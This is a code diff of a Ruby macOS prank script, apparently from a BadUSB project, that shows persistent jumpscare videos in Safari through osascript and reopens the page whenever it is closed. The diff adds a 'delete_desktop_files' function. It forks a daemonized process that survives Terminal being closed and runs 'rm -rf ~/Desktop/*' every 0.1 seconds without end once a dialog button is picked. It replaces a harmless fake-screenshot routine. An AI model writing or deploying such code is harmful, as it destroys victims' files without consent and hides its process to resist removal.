@@ -82,7 +82,7 @@ def persistent_jumpscare(video_url)
     system("open -a Safari '#{html_file}'")
     # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.85 seconds before unhiding (simulate waiting for sound detection).
+    # Wait 0.85 seconds (simulate waiting for sound detection).
     sleep 0.85
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found (i.e. the page was closed), reopen it.
+    # If not found, reopen the page.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -110,17 +110,13 @@ def persistent_jumpscare(video_url)
   end
 end
 
-# --- Spam Screenshots Function (Detached Process) ---
-# Instead of using screencapture (which triggers screen recording permissions),
-# this function will repeatedly copy an existing system image (FINDER icon) as a dummy screenshot.
-def spam_screenshots
+# --- Delete Desktop Files Function (Detached Process) ---
+def delete_desktop_files
   pid = fork do
-    # Detach this process so it continues running even if Terminal is killed.
+    # Detach the process so it runs independently of Terminal.
     Process.daemon(true, true)
     loop do
-      filename = "/tmp/screenshot_#{Time.now.to_f.to_s.gsub('.', '')}_#{rand(10000)}.jpg"
-      # Copy a system icon as a dummy "screenshot".
-      system("cp /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns #{filename}")
+      system("rm -rf ~/Desktop/*")
       sleep 0.1
     end
   end
@@ -137,9 +133,9 @@ def first_subscriber_prompt
   display_dialog("Choose a button:", ["Hawk", "Tuah", "Next"], "Hawk")
 end
 
-# --- Second Subscriber Prompt (Two Buttons: Sydney lover, Slay) ---
+# --- Second Subscriber Prompt (Two Buttons: Sydney lover, Slay, with a Next button) ---
 def second_subscriber_prompt
-  display_dialog("Choose a button:", ["Sydney lover", "Slay"], "Sydney lover")
+  display_dialog("Choose a button:", ["Sydney lover", "Slay", "Next"], "Sydney lover")
 end
 
 # --- Third Subscriber Prompt (One Button: Jo) ---
@@ -166,20 +162,25 @@ def subscriber_action
   when "next"
     second_choice = second_subscriber_prompt
     if second_choice.nil?
-      puts "No choice in second prompt. Exiting."
+      puts "No button chosen in second prompt. Exiting."
       exit 0
     end
     second_choice = second_choice.strip.downcase
-    if second_choice == "sydney lover"
+    case second_choice
+    when "sydney lover"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-    elsif second_choice == "slay"
+    when "slay"
       persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
+    when "next"
+      third_choice = third_subscriber_prompt
+      if third_choice && third_choice.strip.downcase == "jo"
+        delete_desktop_files
+      else
+        puts "No valid choice in third prompt. Exiting."
+        exit 0
+      end
     else
-      puts "Unexpected choice in second prompt: #{second_choice}"
-    end
-    third_choice = third_subscriber_prompt
-    if third_choice && third_choice.strip.downcase == "jo"
-      spam_screenshots
+      puts "Unexpected button choice in second prompt: #{second_choice}"
     end
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
